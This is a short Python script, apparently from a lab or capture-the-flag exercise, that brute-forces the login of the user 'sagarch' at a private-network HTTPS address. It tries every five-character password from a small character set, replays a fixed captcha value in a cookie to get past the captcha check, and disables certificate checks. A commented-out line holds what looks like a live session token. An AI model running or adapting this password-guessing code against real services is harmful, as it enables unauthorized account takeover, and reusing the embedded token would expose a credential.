#!/usr/bin/env python

import requests, json

url = 'https://172.27.30.144'
headers = {'Cookie':'captcha=1996684035902340673545655'}#,
#            'session':'.eJwVzcEKgzAQBNBfKfmCqj0JPRRiisKuCGtD9lhbrGtij2LEf296mLnNvF0t32V4q3JXp6cqFWoz8R1WpqoA26d0ESyLo3FrrSsw1hla9BDYszazo9vWUleADBmKERd4ZkKB4Fag-gyCH0eNoDwmTg2RBXQTWA85iPEur9bW9jnaLsPI83_jqL9gHCMIB7bJi68AhBNon1xIVvqR6qqO4webHD_Q.DbMqMA.NDqII6MFUjcvxVTkuibmUrVTG-U'}

charspace='aeiou1234567890'
#abc = '1234567890'

#for i in range(len(charspace)):
for c1 in charspace:
    for c2 in charspace:
        for c3 in charspace:
            for c4 in charspace:
                for c5 in charspace:
                    password = c1 + c2 +c3 +c4 +c5
                    print(password)
                    data = {'username':'sagarch',
                            'password':password,
                            'captcha':'1996684035902340673545655'}
                    r = requests.post(url, data = data, headers = headers, verify=False)
                    
                    if r.status_code != 401:
                        print "Gotcha!!!"
                        print (r.status_code)
                        exit()
